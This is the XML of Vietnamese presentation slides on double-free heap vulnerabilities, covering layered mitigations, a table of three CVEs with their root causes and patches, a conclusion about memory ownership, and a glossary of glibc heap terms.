                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hardened_malloc, Scudo, tcmalloc dùng drop-in qua </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>LD_PRELOAD</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, kiểm tra chặt hơn glibc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4800600"/>
            <a:ext cx="5522976" cy="1325880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5517"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4965192"/>
            <a:ext cx="5157216"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KHÔNG PHẢI PHÒNG NGỪA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5257800"/>
            <a:ext cx="5157216" cy="758952"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_count=0</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> chỉ để debug: tắt tcache không sửa lỗi logic, chỉ đổi đường đi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1783080"/>
            <a:ext cx="5522976" cy="969264"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7547"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1947672"/>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LUÔN BẬT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="2240280"/>
            <a:ext cx="5157216" cy="402336"/>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ASLR, PIE, NX, Full RELRO ở production: không chặn double free nhưng tăng chi phí chuỗi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="2912364"/>
            <a:ext cx="5522976" cy="969264"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7547"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="3076956"/>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GIẢM ATTACK SURFACE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="3369564"/>
            <a:ext cx="5157216" cy="402336"/>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Không expose VPN/IPsec (33824) hay HTTP/2 (23918) ra Internet khi không cần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4041648"/>
            <a:ext cx="5522976" cy="969264"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7547"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4206240"/>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PATCH MANAGEMENT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4498848"/>
            <a:ext cx="5157216" cy="402336"/>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Theo dõi CISA KEV/NVD: double free bị khai thác nhanh sau khi PoC công khai</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="5170932"/>
            <a:ext cx="5522976" cy="969264"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7547"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5335524"/>
            <a:ext cx="5157216" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>QUYỀN THẤP + SECCOMP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5628132"/>
            <a:ext cx="5157216" cy="402336"/>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Không ngăn khai thác heap, nhưng giới hạn hệ quả nếu chuỗi đi hết</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Đối chiếu với ba CVE ở phần 07</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YÊU CẦU 4 · 7 · 9.5 · TỔNG HỢP TỪ BA CASE THÀNH BIỆN PHÁP THEO TẦNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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11274552" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1920240"/>
                <a:gridCol w="3749040"/>
                <a:gridCol w="3200400"/>
                <a:gridCol w="2404872"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE</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Nguyên nhân gốc</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Biện pháp đúng tầng</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c>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Vá chính thức</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accent1"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE-2026-33824</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Shallow copy con trỏ Security Realm giữa MMSA/PacketContext</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Ownership rõ ràng / deep copy (9.1)</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Bản vá Microsoft 4/2026; tạm chặn UDP 500/4500</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE-2026-23918</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Hai callback độc lập cùng đẩy một h2_stream vào cleanup</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Một đường cleanup duy nhất, idempotent (9.1)</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Nâng Apache lên 2.4.67; tạm tắt mod_http2</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r h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE-2025-62215</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Race condition giữa các luồng kernel cùng chạm một đối tượng</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Đồng bộ hoá free + refcount như một đơn vị (9.1)</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c>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Patch Tuesday 11/2025 của Microsoft</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="91440" marT="45720" marB="45720" anchor="ctr">
                    <a:lnL w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="2E332B"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnL>
                    <a:lnR w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="2E332B"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="2E332B"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="2E332B"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="tx2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4343400"/>
            <a:ext cx="11274552" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3902"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4507992"/>
            <a:ext cx="10908792"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KẾT LUẬN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4800600"/>
            <a:ext cx="10908792" cy="41148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Lỗi không nằm ở một dòng free() lặp lại ngẫu nhiên</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5257800"/>
            <a:ext cx="10908792" cy="850392"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mà ở quyền sở hữu vùng nhớ không được quản lý tại một chỗ duy nhất khi nhiều ngữ cảnh (struct khác, callback khác, thread khác) cùng chạm tới nó. Biện pháp bền nhất luôn ở tầng 9.1; các tầng 9.2–9.4 chỉ giảm thiệt hại hoặc bắt lỗi sớm hơn, không thay được việc sửa đúng chỗ.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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Thuật ngữ nhanh</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10 · TRA CỨU KHI TRÌNH BÀY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="2281428" cy="4114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chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2039112"/>
            <a:ext cx="2281428" cy="716280"/>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Đơn vị cấp phát: header (prev_size, size) + user data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="1417320"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="1581912"/>
            <a:ext cx="2281428" cy="4114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arena</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="2039112"/>
            <a:ext cx="2281428" cy="716280"/>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Vùng quản lý heap; main arena dùng chung, thread có thể có arena phụ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1581912"/>
            <a:ext cx="2281428" cy="4114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top chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="2039112"/>
            <a:ext cx="2281428" cy="716280"/>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Phần heap chưa cấp phát còn lại ở cuối heap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="1417320"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="1581912"/>
            <a:ext cx="2281428" cy="4114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consolidation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="2039112"/>
            <a:ext cx="2281428" cy="716280"/>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Gộp các chunk rảnh kề nhau (hoặc với top) khi free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3093720"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3258312"/>
            <a:ext cx="2281428" cy="4114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tcache_perthread_struct</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3715512"/>
            <a:ext cx="2281428" cy="716280"/>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Metadata tcache mỗi thread (counts[], entries[]), thường ở đầu heap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="3093720"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="3258312"/>
            <a:ext cx="2281428" cy="4114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safe-linking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="3715512"/>
            <a:ext cx="2281428" cy="716280"/>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Mã hoá next (2.32+): stored = ptr ^ (pos &gt;&gt; 12)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="3093720"/>
            <a:ext cx="2647188" cy="1447800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5053"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
